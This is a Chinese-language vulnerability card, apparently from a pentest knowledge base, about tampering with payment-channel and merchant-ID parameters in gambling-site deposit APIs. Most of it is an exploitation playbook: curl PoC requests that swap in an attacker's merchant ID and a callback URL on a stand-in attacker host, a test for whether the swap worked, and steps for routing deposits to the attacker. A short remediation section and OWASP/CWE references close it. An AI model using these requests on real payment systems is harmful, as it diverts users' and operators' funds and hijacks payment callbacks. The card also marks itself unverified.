---
title: 支付通道 / 商户号篡改（充值进攻击者账户）
cve: 无（业务逻辑）
severity: critical
cvss: 9.4
product: 自研充值/支付路由（博彩包网）
versions: 任意
ports: 80, 443
keywords: 支付通道, 商户号, 充值, 路由, 篡改, 资金
entry: /api/pay/create 的 channelId / merchantId / notifyUrl
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/pay/create   {"amount":100,"channelId":3,"merchantId":""}
GET  /api/pay/channels → 返回可用通道列表
```

## 前置条件

- 普通会员账号；能抓充值下单请求。

## PoC

```bash
# 1) 正常下单，记下订单号与通道
curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"amount":100,"channelId":3}' | jq '.data'

# 2) 换通道/商户号，看是否被采纳
curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' \
  -d '{"amount":100,"channelId":3,"merchantId":"<攻击者商户号>","notifyUrl":"https://attacker/n"}' | jq '.data.payUrl'
# 判定：返回的支付链接商户/收款方变成攻击者的 = 命中
```

```bash
# 3) 若只回传 payUrl，检查其参数里是否出现可控的 merchant/uid
curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
  -d '{"amount":1,"channelId":3}' | grep -o 'merchant[^&]*'
```

## 利用步骤

1. 先正常下一单（1 元）走通；
2. 改 merchantId/notifyUrl，看下单回包是否采纳；
3. 采纳即"充值进攻击者"或"回调被劫持"——资金面，直接 critical；
4. 证据：两条下单回包的 payUrl 差异。

## 修复与缓解

- 通道与商户号只由服务端按产品配置选；请求体里的此类字段一律忽略。
- 回调地址固定，签名校验金额/商户/订单号。

## 参考

- OWASP WSTG-BUSL-01；CWE-472。
